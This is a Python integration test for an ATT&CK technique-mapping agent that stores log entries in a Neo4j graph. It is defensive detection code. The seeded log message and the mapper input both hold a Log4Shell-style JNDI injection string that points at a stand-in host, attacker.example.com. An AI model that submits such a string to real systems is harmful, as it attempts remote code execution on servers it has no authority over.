"""Integration tests for ATT&CK Mapper Agent against Neo4j."""

from __future__ import annotations

import pytest

from core.agents.attack_mapper.mapper import ATTACKMapper
from core.graph.client import GraphClient


def is_neo4j_reachable() -> bool:
    try:
        g = GraphClient()
        return g.health_check()
    except Exception:
        return False


@pytest.mark.skipif(
    not is_neo4j_reachable(),
    reason="Neo4j not reachable for integration tests",
)
def test_attack_mapper_live_graph_integration(clean_test_graph) -> None:
    graph = GraphClient()

    # Pre-seed a LogEntry node
    log_id = "TestPhase3_LOG-INTEG-001"
    graph.create_node(
        node_type="LogEntry",
        properties={
            "id": log_id,
            "source": "syslog",
            "message": "${jndi:ldap://attacker.example.com/exploit} HTTP/1.1",
            "timestamp": "2026-09-28T12:00:00Z",
            "source_ip": "192.168.1.100",
        },
    )

    mapper = ATTACKMapper(graph_client=graph)
    results = mapper.map_text(
        text="${jndi:ldap://attacker.example.com/exploit}",
        evidence_id=log_id,
        actor="attack_mapper",
    )

    assert len(results) > 0
    assert any(r.technique_id == "T1190" for r in results)

    # Verify MAPS_TO edge was created
    from core.graph.queries import QueryLibrary

    ql = QueryLibrary(graph)
    edges = ql.get_edges_by_type(edge_type="MAPS_TO")
    log_edges = [e for e in edges if e.get("from_id") == log_id]
    assert len(log_edges) > 0
